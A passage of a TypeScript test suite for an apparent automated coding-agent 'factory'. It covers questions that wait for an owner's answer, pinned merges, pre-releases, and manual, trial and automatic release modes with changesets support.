    const sandbox = new FakeSandbox(changed())
    const builder = askingBuilder()
    await runTask(deps(sandbox, { harness: builder }), id)

    await expect(resumeTask(deps(sandbox, { harness: builder }), id)).rejects.toThrow(
      /no answered question/,
    )
    githubApi.replies = [owner()]
    await poll(sandbox)
    await resumeTask(deps(sandbox, { harness: builder }), id)
    await expect(resumeTask(deps(sandbox, { harness: builder }), id)).rejects.toThrow(
      /no answered question/,
    )
  })

  it('keeps the attempt count when the question comes during a rework', async () => {
    const id = await seedTask()
    const sandbox = new FakeSandbox(changed())
    const asked: string[] = []
    const builder: CodingHarness & { n: number } = {
      name: 'fake-agent',
      egress: agentEgress,
      n: 0,
      run: async () => {
        dirty = true
        return { ok: true, summary: 'first pass', sessionId: 'sess-r' }
      },
      resume: async (_b, _id, input) => {
        dirty = true
        builder.n += 1
        asked.push(input.prompt)
        return builder.n === 1
          ? { ok: true, summary: 'hmm\nQUESTION: Keep the old export too?', sessionId: 'sess-r' }
          : { ok: true, summary: 'reworked', sessionId: 'sess-r' }
      },
    }
    const reviewer = reviewerSaying(verdictJson('changes', [finding]), verdictJson('approve'))

    const parked = await runTask(deps(sandbox, { harness: builder, reviewer }), id)
    expect(parked.status).toBe('waiting')
    const [stored] = await getDb().select().from(question).where(eq(question.taskId, id))
    expect(stored.attempt).toBe(2)

    githubApi.replies = [owner({ body: 'No, drop it.' })]
    await poll(sandbox)
    const result = await resumeTask(deps(sandbox, { harness: builder, reviewer }), id)

    expect(result).toMatchObject({ status: 'done' })
    const verifies = (
      await getDb().select().from(stageEvent).where(eq(stageEvent.stage, 'verify'))
    ).map((e) => (e.detail as { attempt: number }).attempt)
    expect(verifies).toEqual([1, 2])
    expect(asked[1]).toContain('No, drop it.')
  })

  it('lets a question that nobody answered fail its task and frees the snapshot', async () => {
    const id = await seedTask()
    const sandbox = new FakeSandbox(changed())
    await runTask(deps(sandbox, { harness: askingBuilder() }), id)

    const later = () => new Date(Date.now() + 8 * 86_400_000)
    const result = await poll(sandbox, { now: later })

    expect(result.expired).toHaveLength(1)
    expect(sandbox.deleted).toEqual(['snap-1'])
    const failed = (
      await getDb().select().from(stageEvent).where(eq(stageEvent.stage, 'failed'))
    )[0]
    expect(failed.detail).toMatchObject({ failedAt: 'waiting' })
    expect((failed.detail as { error: string }).error).toContain('nobody answered in 7 days')
  })

  it('fails, saying why, when the provider cannot save a sandbox or the agent left no session', async () => {
    const noSnapshot = new FakeSandbox(changed())
    const create = noSnapshot.create.bind(noSnapshot)
    noSnapshot.create = async (spec) => ({ ...(await create(spec)), snapshot: undefined })
    const id1 = await seedTask()
    const a = await runTask(deps(noSnapshot, { harness: askingBuilder() }), id1)
    expect(a).toMatchObject({ status: 'failed', stage: 'build' })
    expect(a.status === 'failed' && a.error).toContain('cannot save a sandbox to wait')
    expect(githubApi.comments).toHaveLength(0)

    const sandbox = new FakeSandbox(changed())
    await getPool().query(
      'truncate table agent_run, watch, delivery, decision, question, review, evidence, stage_event, task, ingress, repository restart identity cascade',
    )
    const id2 = await seedTask()
    const b = await runTask(
      deps(sandbox, { harness: askingBuilder({ sessionId: undefined }) }),
      id2,
    )
    expect(b).toMatchObject({ status: 'failed' })
    expect(b.status === 'failed' && b.error).toContain('gave no session to resume')
    expect(sandbox.snapshots).toEqual([])
  })

  it('frees the snapshot when the comment cannot be posted', async () => {
    const id = await seedTask()
    const sandbox = new FakeSandbox(changed())
    const broken = {
      ...githubApi,
      commentOnIssue: async () => {
        throw new Error('GitHub answered 403')
      },
    }

    const result = await runTask(deps(sandbox, { harness: askingBuilder(), githubApi: broken }), id)

    expect(result).toMatchObject({ status: 'failed' })
    expect(sandbox.deleted).toEqual(['snap-1'])
    expect(await getDb().select().from(question)).toEqual([])
  })
})

const deliveries = async (taskId: number) =>
  getDb().select().from(delivery).where(eq(delivery.taskId, taskId)).orderBy(delivery.id)

const openPullRequest = (over: Partial<PullRequestState> = {}): PullRequestState => ({
  number: 12,
  url: PR_URL,
  headSha: 'abc123def',
  draft: false,
  state: 'open',
  merged: false,
  ...over,
})

describe('the factory always makes a pre-release', () => {
  it('tags the commit it delivered, marked as a pre-release, with the evidence in the notes', async () => {
    const id = await seedTask()

    const result = await runTask(deps(new FakeSandbox(changed())), id)

    expect(result).toMatchObject({ status: 'done', preRelease: 'pre/7-develop' })
    expect(githubApi.releases).toHaveLength(1)
    // The tag is on the pre-release branch, where the work now is, not on the factory's own commit.
    expect(githubApi.releases[0]).toMatchObject({
      tag: 'pre/7-develop',
      sha: 'develop0001',
      prerelease: true,
      name: '#7 Add truncate',
    })
    expect(githubApi.releases[0].body).toContain('- passed: `npm test`')
    expect(githubApi.releases[0].body).toContain('Independent review: fake-reviewer: approve.')
    expect(githubApi.releases[0].body).toContain(PR_URL)
    expect(await deliveries(id)).toMatchObject([
      { kind: 'prerelease', tag: 'pre/7-develop', sha: 'develop0001', actor: 'factory' },
    ])
    const done = (await getDb().select().from(stageEvent).where(eq(stageEvent.stage, 'done')))[0]
    expect(done.detail).toMatchObject({ preRelease: 'pre/7-develop' })
  })

  it('integrates the approved work: merges the verified commit into workspace, then advances develop', async () => {
    const id = await seedTask()

    await runTask(deps(new FakeSandbox(changed())), id)

    expect(githubApi.merges).toEqual([{ number: 12, sha: 'abc123def' }])
    expect(githubApi.branchMerges).toEqual([{ base: 'develop', head: 'merge0001' }])
    // The squash is named after the pull request, so GitHub adds no Co-authored-by trailer to it (#13).
    expect(githubApi.mergeKinds).toEqual([
      { method: 'squash', title: expect.stringMatching(/ \(#7\)$/) },
    ])
    const [row] = await getDb().select().from(task).where(eq(task.id, id))
    expect(row).toMatchObject({ stage: 'done', mergedSha: 'merge0001' })
    const done = (await getDb().select().from(stageEvent).where(eq(stageEvent.stage, 'done')))[0]
    expect(done.detail).toMatchObject({ mergedSha: 'merge0001', developSha: 'develop0001' })
  })

  it('leaves the pull request open for a person when GitHub will not merge it, and still hands it over', async () => {
    githubApi.mergeFails = true
    const id = await seedTask()

    const result = await runTask(deps(new FakeSandbox(changed())), id)

    expect(result).toMatchObject({ status: 'done', preRelease: 'pre/7-abc123d' })
    expect(githubApi.branchMerges).toEqual([])
    const [row] = await getDb().select().from(task).where(eq(task.id, id))
    expect(row.mergedSha).toBeNull()
    expect(githubApi.releases[0]).toMatchObject({ sha: 'abc123def' })
    const done = (await getDb().select().from(stageEvent).where(eq(stageEvent.stage, 'done')))[0]
    expect(done.detail).toMatchObject({ integrationError: expect.stringContaining('conflicts') })
  })

  it('leaves the merge to GitHub when the integration branch requires checks, pinned to the verified commit', async () => {
    githubApi.required = ['CI', 'Lint']
    const id = await seedTask()

    const result = await runTask(deps(new FakeSandbox(changed())), id)

    expect(result).toMatchObject({ status: 'done' })
    expect(result).not.toHaveProperty('preRelease')
    expect(githubApi.autoMerges).toEqual([{ number: 12, sha: 'abc123def' }])
    expect(githubApi.merges).toEqual([])
    expect(githubApi.branchMerges).toEqual([])
    // The pre-release follows the merge, which the repository's CI decides.
    expect(githubApi.releases).toEqual([])
    const [row] = await getDb().select().from(task).where(eq(task.id, id))
    expect(row).toMatchObject({ stage: 'done', mergedSha: null, awaitingCiSha: 'abc123def' })
    const done = (await getDb().select().from(stageEvent).where(eq(stageEvent.stage, 'done')))[0]
    expect(done.detail).toMatchObject({
      awaitingChecks: ['CI', 'Lint'],
      pullRequestUrl: PR_URL,
      agentSummary: 'added truncate',
    })
    expect((done.detail as Record<string, unknown>).integrationError).toBeUndefined()
  })

  it('fails the task saying what to configure when GitHub will not turn auto-merge on', async () => {
    githubApi.required = ['CI']
    githubApi.autoMergeRefused = true
    const id = await seedTask()

    await runTask(deps(new FakeSandbox(changed())), id)

    expect(githubApi.merges).toEqual([])
    const [row] = await getDb().select().from(task).where(eq(task.id, id))
    expect(row).toMatchObject({ stage: 'failed', awaitingCiSha: null })
    const failed = (
      await getDb().select().from(stageEvent).where(eq(stageEvent.stage, 'failed'))
    )[0]
    expect(String((failed.detail as Record<string, unknown>).error)).toMatch(
      /Allow auto-merge.*Allow merge commits/,
    )
  })

  it('merges at once, pinned to the verified commit, when GitHub refuses auto-merge because the checks already passed', async () => {
    githubApi.required = ['CI']
    githubApi.autoMergeRefused = true
    githubApi.autoMergeRefusal = CLEAN
    const id = await seedTask()

    const result = await runTask(deps(new FakeSandbox(changed())), id)

    expect(result).toMatchObject({ status: 'done', preRelease: 'pre/7-develop' })
    expect(githubApi.merges).toEqual([{ number: 12, sha: 'abc123def' }])
    expect(githubApi.mergeKinds).toEqual([
      { method: 'squash', title: expect.stringMatching(/ \(#7\)$/) },
    ])
    expect(githubApi.branchMerges).toEqual([{ base: 'develop', head: 'merge0001' }])
    const [row] = await getDb().select().from(task).where(eq(task.id, id))
    expect(row).toMatchObject({ stage: 'done', mergedSha: 'merge0001', awaitingCiSha: null })
    const done = (await getDb().select().from(stageEvent).where(eq(stageEvent.stage, 'done')))[0]
    expect(done.detail).toMatchObject({ mergedSha: 'merge0001', developSha: 'develop0001' })
    expect((done.detail as Record<string, unknown>).awaitingChecks).toBeUndefined()
  })

  it('still fails the task with what to configure when the refusal is not about a clean pull request', async () => {
    githubApi.required = ['CI']
    githubApi.autoMergeRefused = true
    githubApi.autoMergeRefusal = 'Pull request Pull request is in unstable status'
    const id = await seedTask()

    await runTask(deps(new FakeSandbox(changed())), id)

    expect(githubApi.merges).toEqual([])
    const [row] = await getDb().select().from(task).where(eq(task.id, id))
    expect(row).toMatchObject({ stage: 'failed', mergedSha: null })
    const failed = (
      await getDb().select().from(stageEvent).where(eq(stageEvent.stage, 'failed'))
    )[0]
    expect(String((failed.detail as Record<string, unknown>).error)).toMatch(
      /unstable status.*Allow auto-merge/,
    )
  })

  it('keeps the work integrated and says why when develop cannot be advanced', async () => {
    githubApi.branchMergeFails = true
    const id = await seedTask()

    const result = await runTask(deps(new FakeSandbox(changed())), id)

    expect(result).toMatchObject({ status: 'done', preRelease: 'pre/7-merge00' })
    const [row] = await getDb().select().from(task).where(eq(task.id, id))
    expect(row.mergedSha).toBe('merge0001')
    expect(githubApi.releases[0]).toMatchObject({ sha: 'merge0001' })
    const done = (await getDb().select().from(stageEvent).where(eq(stageEvent.stage, 'done')))[0]
    expect(done.detail).toMatchObject({
      mergedSha: 'merge0001',
      developError: expect.stringContaining('protected'),
      developPullRequest: PR_URL,
    })
    // A protected branch takes a pull request, which the factory opens and never merges.
    expect(githubApi.pulls).toEqual(['factory/7', 'workspace'])
    expect(githubApi.bases).toEqual(['workspace', 'develop'])
    expect(githubApi.merges).toEqual([{ number: 12, sha: 'abc123def' }])
  })

  it('still integrates when even the pull request to develop cannot be opened', async () => {
    githubApi.branchMergeFails = true
    githubApi.openFailsFor = 'workspace'
    const id = await seedTask()

    const result = await runTask(deps(new FakeSandbox(changed())), id)

    expect(result).toMatchObject({ status: 'done' })
    const done = (await getDb().select().from(stageEvent).where(eq(stageEvent.stage, 'done')))[0]
    expect(done.detail).toMatchObject({ mergedSha: 'merge0001' })
    expect((done.detail as Record<string, unknown>).developPullRequest).toBeUndefined()
  })

  it('never merges work that was handed over to a person', async () => {
    const id = await seedTask()
    const reviewer = reviewerSaying(verdictJson('changes', [finding]))

    await runTask(deps(new FakeSandbox(changed()), { reviewer }), id)

    expect(githubApi.merges).toEqual([])
    expect(githubApi.branchMerges).toEqual([])
    expect(githubApi.drafts).toEqual([true])
  })

  it('delivers once, at the commit the work ended on, after a rework', async () => {
    const id = await seedTask()
    const builder = resumableBuilder()
    const reviewer = reviewerSaying(verdictJson('changes', [finding]), verdictJson('approve'))

    const result = await runTask(
      deps(new FakeSandbox(changed()), { harness: builder, reviewer }),
      id,
    )

    expect(result).toMatchObject({ status: 'done', sha: 'abc123def2' })
    expect(githubApi.releases).toHaveLength(1)
    expect(githubApi.releases[0]).toMatchObject({ sha: 'develop0001' })
    expect(githubApi.merges).toEqual([{ number: 12, sha: 'abc123def2' }])
    expect(githubApi.releases[0].body).toContain('Attempts: 2.')
  })

  it('hands over work the reviewer did not approve as a pre-release too, and says so', async () => {
    const id = await seedTask()
    const reviewer = reviewerSaying(verdictJson('changes', [finding], 'still wrong'))

    const result = await runTask(deps(new FakeSandbox(changed()), { reviewer }), id)

    expect(result).toMatchObject({ status: 'handoff', preRelease: 'pre/7-abc123d' })
    expect(githubApi.releases[0].body).toContain(
      'Independent review: fake-reviewer: changes. still wrong',
    )
    expect((await deliveries(id))[0]).toMatchObject({ kind: 'prerelease' })
  })

  it('makes none when the checks never passed, because there is nothing to hand over', async () => {
    const id = await seedTask()
    const sandbox = new FakeSandbox(
      changed((c) => (c.endsWith('npm test') ? { exitCode: 1, stdout: 'not ok' } : undefined)),
    )

    const result = await runTask(deps(sandbox), id)

    expect(result).toMatchObject({ status: 'failed', stage: 'verify' })
    expect(githubApi.releases).toEqual([])
    expect(await deliveries(id)).toEqual([])
  })

  it('does not fail the task when GitHub refuses the pre-release, and says why', async () => {
    const id = await seedTask()
    githubApi.releaseFails = true

    const result = await runTask(deps(new FakeSandbox(changed())), id)

    expect(result).toMatchObject({ status: 'done', pullRequestUrl: PR_URL })
    expect(await deliveries(id)).toEqual([])
    const done = (await getDb().select().from(stageEvent).where(eq(stageEvent.stage, 'done')))[0]
    expect((done.detail as { preReleaseError: string }).preReleaseError).toContain(
      'creating the release',
    )
  })
})

describe('what the factory does with a release', () => {
  const run = async (mode?: 'manual' | 'trial' | 'auto') => {
    const id = await seedTask()
    githubApi.pullRequest = openPullRequest()
    const result = await runTask(deps(new FakeSandbox(changed()), { releaseMode: mode }), id)
    return { id, result }
  }

  it('leaves the release to a person by default: the work is integrated and nothing is released', async () => {
    const { id, result } = await run()
    expect(result).toMatchObject({ status: 'done', released: undefined })
    expect(githubApi.merges).toEqual([{ number: 12, sha: 'abc123def' }])
    expect(githubApi.releases.every((r) => r.prerelease)).toBe(true)
    expect((await getDb().select().from(task).where(eq(task.id, id)))[0].stage).toBe('done')
  })

  it('in trial, records what an agent would have released and releases nothing', async () => {
    const { id } = await run('trial')
    expect(githubApi.merges).toEqual([{ number: 12, sha: 'abc123def' }])
    expect(githubApi.releases.every((r) => r.prerelease)).toBe(true)
    expect(await getDb().select().from(decision).where(eq(decision.taskId, id))).toMatchObject([
      {
        kind: 'would_release',
        sha: 'abc123def',
        note: 'agent:fake-reviewer: checks green and the review approved',
      },
    ])
  })

  it("in auto, promotes develop to the default branch and publishes the release on the agent's verdict", async () => {
    const { id, result } = await run('auto')

    expect(result).toMatchObject({ status: 'done', released: 'v0.1.0' })
    // The integration, then the promotion of develop through its own pull request.
    expect(githubApi.merges).toEqual([
      { number: 12, sha: 'abc123def' },
      { number: 12, sha: 'abc123def' },
    ])
    expect(githubApi.pulls).toEqual(['factory/7', 'develop'])
    expect(githubApi.bases).toEqual(['workspace', 'main'])
    expect((await getDb().select().from(task).where(eq(task.id, id)))[0].stage).toBe('released')
    expect((await deliveries(id)).map((d) => [d.kind, d.tag, d.actor])).toEqual([
      ['prerelease', 'pre/7-develop', 'factory'],
      ['release', 'v0.1.0', 'agent:fake-reviewer'],
    ])
    const published = githubApi.releases.at(-1)!
    expect(published).toMatchObject({ tag: 'v0.1.0', sha: 'merge0001', prerelease: false })
    expect(published.body).toContain('pre/7-develop')
  })

  it('in auto, keeps the task at done and records why when the release is refused', async () => {
    const id = await seedTask()
    githubApi.pullRequest = openPullRequest({ draft: true })

    const result = await runTask(deps(new FakeSandbox(changed()), { releaseMode: 'auto' }), id)

    expect(result).toMatchObject({ status: 'done', released: undefined })
    expect(githubApi.merges).toEqual([{ number: 12, sha: 'abc123def' }])
    const [refused] = await getDb().select().from(decision).where(eq(decision.taskId, id))
    expect(refused.note).toContain(
      'an automatic release was refused: the release pull request is a draft',
    )
  })

  it('does not release work that was handed over, whatever the mode', async () => {
    const id = await seedTask()
    githubApi.pullRequest = openPullRequest()
    const reviewer = reviewerSaying(verdictJson('changes', [finding]))
    await runTask(deps(new FakeSandbox(changed()), { reviewer, releaseMode: 'auto' }), id)
    expect(githubApi.merges).toEqual([])
  })
})

/** A file a comparison lists as new since the merge base, and one it lists as changed. */
const added = (path: string): ChangedFile => ({ path, status: 'added' })
const modified = (path: string): ChangedFile => ({ path, status: 'modified' })

describe('release', () => {
  const dependencies = () => ({ db: getDb(), github, api: githubApi })
  const reset = async () => {
    await getPool().query(
      'truncate table agent_run, watch, delivery, decision, question, review, evidence, stage_event, task, ingress, repository restart identity cascade',
    )
    dirty = true
  }

  async function delivered() {
    const id = await seedTask()
    await runTask(deps(new FakeSandbox(changed())), id)
    githubApi.pullRequest = openPullRequest()
    return id
  }

  it('promotes develop through a pull request into the default branch, pinned to what it saw, and publishes the next version', async () => {
    const id = await delivered()
    githubApi.latest = 'v1.2.3'

    const result = await release(dependencies(), id, { bump: 'minor', actor: 'human' })

    expect(result).toMatchObject({ tag: 'v1.3.0', mergeSha: 'merge0001' })
    // The integration merge first, then the promotion, pinned to the head of the release pull request.
    expect(githubApi.merges).toEqual([
      { number: 12, sha: 'abc123def' },
      { number: 12, sha: 'abc123def' },
    ])
    expect(githubApi.releases.at(-1)).toMatchObject({
      tag: 'v1.3.0',
      prerelease: false,
      sha: 'merge0001',
    })
    const [row] = await getDb().select().from(task).where(eq(task.id, id))
    expect(row.stage).toBe('released')
    expect(await getDb().select().from(decision).where(eq(decision.taskId, id))).toMatchObject([
      { kind: 'release', sha: 'abc123def', note: 'human -> v1.3.0' },
    ])
    expect((await deliveries(id)).at(-1)).toMatchObject({
      kind: 'release',
      tag: 'v1.3.0',
      actor: 'human',
    })
    expect(await stagesOf(id)).toContain('released')
    // The merge is on the default branch now, so its checks are watched from here on.
    expect(await getDb().select().from(watch).where(eq(watch.taskId, id))).toMatchObject([
      {
        sha: 'merge0001',
        pullRequestNumber: 12,
        tag: 'v1.3.0',
        status: 'watching',
        repository: 'paulo/app',
      },
    ])
  })

  /** A task integrated before the one released: done, with its merge on the integration branch. */
  async function integrated(issueNumber: number, mergedSha: string) {
    const id = await seedTask(issueNumber)
    await getDb().update(task).set({ stage: 'done', mergedSha }).where(eq(task.id, id))
    return id
  }
  const stageOf = async (id: number) =>
    (await getDb().select().from(task).where(eq(task.id, id)))[0].stage
  const releasedDetail = async (id: number) =>
    (await getDb().select().from(stageEvent).where(eq(stageEvent.taskId, id))).find(
      (e) => e.stage === 'released',
    )?.detail

  it('releases every integrated task the promotion contains, and leaves out one it does not', async () => {
    const asked = await delivered()
    const contained = await integrated(8, 'inside01')
    const later = await integrated(9, 'outside01')
    githubApi.outside.add('outside01')
    githubApi.latest = 'v1.2.3'

    await release(dependencies(), asked, { bump: 'minor', actor: 'human' })

    expect(await stageOf(asked)).toBe('released')
    expect(await stageOf(contained)).toBe('released')
    expect(await stageOf(later)).toBe('done')
    expect((await deliveries(contained)).map((d) => [d.kind, d.tag, d.sha, d.actor])).toEqual([
      ['release', 'v1.3.0', 'merge0001', 'human'],
    ])
    expect(await deliveries(later)).toEqual([])
    expect(await releasedDetail(contained)).toMatchObject({ tag: 'v1.3.0', mergeSha: 'merge0001' })
  })

  /** A task finished with no change: done, resolved at a commit of the integration branch, nothing merged. */
  async function resolvedAt(issueNumber: number, resolvedSha: string) {
    const id = await seedTask(issueNumber)
    await getDb().update(task).set({ stage: 'done', resolvedSha }).where(eq(task.id, id))
    return id
  }

  it('releases a task resolved with no change once a release puts its resolving commit on the release branch', async () => {
    const asked = await delivered()
    const resolved = await resolvedAt(8, 'resolved01')
    githubApi.latest = 'v1.2.3'

    await release(dependencies(), asked, { bump: 'minor', actor: 'human' })

    expect(await stageOf(resolved)).toBe('released')
    expect(await releasedDetail(resolved)).toEqual({
      actor: 'human',
      releaseBranch: 'main',
      resolvedSha: 'resolved01',
      mergeSha: 'merge0001',
    })
    // Its issue was closed when it was resolved, and no tag carries it.
    expect(githubApi.closed).not.toContain(8)
    expect(await deliveries(resolved)).toEqual([])
  })

  it('leaves a task resolved with no change alone while the release branch does not contain its commit', async () => {
    const asked = await delivered()
    const resolved = await resolvedAt(8, 'outside01')
    githubApi.outside.add('outside01')
    githubApi.latest = 'v1.2.3'

    await release(dependencies(), asked, { bump: 'minor', actor: 'human' })

    expect(await stageOf(resolved)).toBe('done')
    expect(await releasedDetail(resolved)).toBeUndefined()
  })

  it('comments the version and its release on every released issue, the asked one included, and closes them', async () => {
    const asked = await delivered()
    await integrated(8, 'inside01')
    await integrated(9, 'outside01')
    githubApi.outside.add('outside01')
    githubApi.latest = 'v1.2.3'

    await release(dependencies(), asked, { bump: 'minor', actor: 'human' })

    expect(githubApi.closed.sort()).toEqual([7, 8])
    const announced = githubApi.commentsOn.filter((c) => c.body.includes('Available in'))
    expect(announced.map((c) => c.issue).sort()).toEqual([7, 8])
    for (const c of announced) {
      expect(c.body).toContain(
        'Available in `v1.3.0` (https://github.com/paulo/app/releases/tag/v1.3.0).',
      )
      expect(c.body).toContain('Released by human: the promotion `merge00` to `main`')
    }
  })

  it('keeps the release when an issue cannot be closed, and records why on that task', async () => {
    const asked = await delivered()
    const contained = await integrated(8, 'inside01')
    githubApi.closeFails.add(8)

    const result = await release(dependencies(), asked, { bump: 'patch', actor: 'human' })

    expect(result).toMatchObject({ tag: 'v0.1.0', mergeSha: 'merge0001' })
    expect(result.issueErrors).toEqual([expect.stringMatching(/#8: .*403 closing paulo\/app#8/)])
    expect(await stageOf(asked)).toBe('released')
    expect(await stageOf(contained)).toBe('released')
    expect(githubApi.closed).toEqual([7])
    expect(await releasedDetail(contained)).toMatchObject({
      issueError: expect.stringContaining('403 closing paulo/app#8'),
    })
  })

  it('hands a repository that publishes with changesets to its own workflow: no tag of the factory, a publication waits', async () => {
    const id = await delivered()
    githubApi.changesets = ['config.json', 'README.md', 'brave-fox.md']
    githubApi.changed = [added('.changeset/brave-fox.md')]
    githubApi.latest = 'v1.2.3'

    const result = await release(dependencies(), id, { bump: 'minor', actor: 'human' })

    expect(result).toMatchObject({
      tag: undefined,
      mergeSha: 'merge0001',
      publishing: 'changesets',
    })
    expect(githubApi.merges).toHaveLength(2)
    expect(githubApi.releases.filter((r) => !r.prerelease)).toEqual([])
    expect(await getDb().select().from(publication)).toMatchObject([
      {
        taskId: id,
        repository: 'paulo/app',
        releaseBranch: 'main',
        promotedSha: 'merge0001',
        actor: 'human',
        status: 'waiting',
      },
    ])
    expect((await deliveries(id)).filter((d) => d.kind === 'release')).toEqual([])
    const [row] = await getDb().select().from(task).where(eq(task.id, id))
    expect(row.stage).toBe('released')
    const released = (
      await getDb().select().from(stageEvent).where(eq(stageEvent.stage, 'released'))
    )[0]
    expect(released.detail).toMatchObject({ publishing: 'changesets', mergeSha: 'merge0001' })
    expect(await getDb().select().from(watch).where(eq(watch.taskId, id))).toMatchObject([
      { sha: 'merge0001', tag: null, status: 'watching' },
    ])
  })

  /** A changesets repository like theokit: a private root, one published package and one ignored app. */
  function changesetsMonorepo(changed: string[]) {
    githubApi.changesets = ['config.json', 'README.md']
    githubApi.changed = changed.map(modified)
    githubApi.tree = {
      'package.json': '{"name":"theokit-monorepo","private":true}',
      '.changeset/config.json': '{"ignore":["theoclaw"]}',
      'packages/ui/package.json': '{"name":"@theokit/ui","version":"1.13.0"}',
      'packages/ui/src/index.ts': '',
      'apps/theoclaw/package.json': '{"name":"theoclaw","version":"0.1.0"}',
      'apps/theoclaw/src/a.ts': '',
    }
  }

  it('releases as its own when develop has no changeset and changes only packages changesets never publishes', async () => {
    const id = await delivered()
    const contained = await integrated(8, 'inside01')
    changesetsMonorepo(['apps/theoclaw/src/a.ts', 'pnpm-lock.yaml', '.github/workflows/ci.yml'])
    githubApi.latest = 'v1.2.0'

    const result = await release(dependencies(), id, { bump: 'minor', actor: 'human' })

    expect(result).toMatchObject({ tag: 'v1.3.0', mergeSha: 'merge0001' })
    expect(result.publishing).toBeUndefined()
    expect(githubApi.compared).toEqual(['main'])
    expect(githubApi.merges).toHaveLength(2)
    expect(githubApi.releases.at(-1)).toMatchObject({ tag: 'v1.3.0', prerelease: false })
    expect(await getDb().select().from(publication)).toEqual([])
    expect(await stageOf(id)).toBe('released')
    expect(await stageOf(contained)).toBe('released')
    expect(githubApi.closed.sort()).toEqual([7, 8])
  })

  it('refuses a release with no changeset when a package changesets publishes changed, and names it', async () => {
    const id = await delivered()
    changesetsMonorepo(['apps/theoclaw/src/a.ts', 'packages/ui/src/index.ts'])

    await expect(release(dependencies(), id, { bump: 'patch', actor: 'human' })).rejects.toThrow(
      /develop has no changeset, and it changes @theokit\/ui since main/,
    )
    expect(githubApi.merges).toHaveLength(1)
    expect(await stageOf(id)).toBe('done')
    expect(await getDb().select().from(publication)).toEqual([])
  })

  it('takes the changesets path when develop added a changeset since its merge base with the release branch', async () => {
    const id = await delivered()
    changesetsMonorepo(['packages/ui/src/index.ts'])
    githubApi.changesets = ['config.json', 'brave-fox.md']
    githubApi.changed.push(added('.changeset/brave-fox.md'))

    const result = await release(dependencies(), id, { bump: 'patch', actor: 'human' })

    expect(result).toMatchObject({ publishing: 'changesets', tag: undefined })
    expect(githubApi.compared).toEqual(['main'])
    expect(githubApi.releases.filter((r) => !r.prerelease)).toEqual([])
    expect(await getDb().select().from(publication)).toHaveLength(1)
  })

  it('does not count changesets the release branch already consumed: develop still holds them, none was added since the merge base', async () => {
    const id = await delivered()
    // theokit-plugins after Version Packages #250: main deleted the changesets, develop kept them.
    changesetsMonorepo(['.github/workflows/ci.yml', 'CHANGELOG.md'])
    githubApi.changesets = ['config.json', 'README.md', 'wake-word-detector.md', 'brave-fox.md']
    githubApi.latest = 'v0.3.0'

    const result = await release(dependencies(), id, { bump: 'patch', actor: 'human' })

    expect(result).toMatchObject({ tag: 'v0.3.1', mergeSha: 'merge0001' })
    expect(result.publishing).toBeUndefined()
    expect(githubApi.compared).toEqual(['main'])
    expect(await getDb().select().from(publication)).toEqual([])
  })

  it('still refuses when develop only holds consumed changesets and changes a package changesets publishes', async () => {
    const id = await delivered()
    changesetsMonorepo(['packages/ui/src/index.ts'])
    githubApi.changesets = ['config.json', 'brave-fox.md']

    await expect(release(dependencies(), id, { bump: 'patch', actor: 'human' })).rejects.toThrow(
      /develop has no changeset, and it changes @theokit\/ui since main/,
    )
    expect(await getDb().select().from(publication)).toEqual([])
  })

  it('waits for the release branch checks as its own release, when only unpublished packages changed', async () => {
    const id = await delivered()
    changesetsMonorepo(['apps/theoclaw/src/a.ts'])
    githubApi.releaseRequired = ['CI']

    const result = await release(dependencies(), id, { bump: 'patch', actor: 'human' })

    expect(result).toMatchObject({ awaitingChecks: ['CI'] })
    expect(result.publishing).toBeUndefined()
    expect(await getDb().select().from(releaseWait)).toMatchObject([{ changesets: false }])
  })

  it('promotes into the release branch the owner named, not the default branch', async () => {
    await getDb()
      .insert(repository)
      .values({ fullName: 'paulo/app', enabled: true, releaseBranch: 'stable' })
    githubApi.branches.heads.set('stable', 's'.repeat(40))
    const id = await delivered()

    await release(dependencies(), id, { bump: 'patch', actor: 'human' })

    expect(githubApi.bases).toEqual(['workspace', 'stable'])
  })

  it('starts at v0.1.0 when the repository has no release yet', async () => {
    const id = await delivered()
    expect((await release(dependencies(), id, { bump: 'major', actor: 'human' })).tag).toBe(
      'v0.1.0',
    )
  })

  it('refuses a commit with no pre-release, red checks, or a task that is not finished', async () => {
    const running = await seedTask()
    await expect(
      release(dependencies(), running, { bump: 'patch', actor: 'human' }),
    ).rejects.toThrow(/only a finished task/)

    await reset()
    const noPre = await delivered()
    await getDb().delete(delivery).where(eq(delivery.taskId, noPre))
    await expect(release(dependencies(), noPre, { bump: 'patch', actor: 'human' })).rejects.toThrow(
      /no pre-release for this work/,
    )

    await reset()
    const notIntegrated = await delivered()
    await getDb().update(task).set({ mergedSha: null }).where(eq(task.id, notIntegrated))
    await expect(
      release(dependencies(), notIntegrated, { bump: 'patch', actor: 'human' }),
    ).rejects.toThrow(/was not integrated/)

    await reset()
    const red = await delivered()
    await getDb().update(evidence).set({ passed: false }).where(eq(evidence.taskId, red))
    await expect(release(dependencies(), red, { bump: 'patch', actor: 'human' })).rejects.toThrow(
      /checks are not green/,
    )
    // One integration merge for each of the three runs that finished above, and no promotion.
    expect(githubApi.merges.length).toBe(3)
  })

  it('refuses when the release pull request is a draft, closed or missing, or cannot be opened', async () => {
    const id = await delivered()
    const cases: [PullRequestState | undefined, RegExp][] = [
      [openPullRequest({ draft: true }), /draft/],
      [openPullRequest({ state: 'closed' }), /closed/],
      [undefined, /not found/],
    ]
    for (const [pr, message] of cases) {
      githubApi.pullRequest = pr
      await expect(release(dependencies(), id, { bump: 'patch', actor: 'human' })).rejects.toThrow(
        message,
      )
    }
    const nothing = {
      ...githubApi,
      openPullRequest: async () => {
        throw new Error(
          'GitHub answered 422 opening a pull request: No commits between main and develop',
        )
      },
    }
    await expect(
      release({ db: getDb(), github, api: nothing }, id, { bump: 'patch', actor: 'human' }),
    ).rejects.toThrow(/could not be opened.*No commits between/)
    expect(githubApi.merges.length).toBe(1)
    expect((await getDb().select().from(task).where(eq(task.id, id)))[0].stage).toBe('done')
  })

  it('does not release twice', async () => {
    const id = await delivered()
    await release(dependencies(), id, { bump: 'patch', actor: 'human' })
    await expect(release(dependencies(), id, { bump: 'patch', actor: 'human' })).rejects.toThrow(
      /already released/,
    )
    expect(githubApi.merges).toHaveLength(2)
  })

  it('gives the task back when GitHub will not merge, and says what GitHub said', async () => {
    const id = await delivered()
    const refusing = {
      ...githubApi,
      mergePullRequest: async () => {
        throw new Error('GitHub answered 409 merging paulo/app#12: Head branch was modified')
      },
    }

    await expect(
      release({ db: getDb(), github, api: refusing }, id, { bump: 'patch', actor: 'human' }),
    ).rejects.toThrow(/GitHub did not merge it:.*Head branch was modified/)

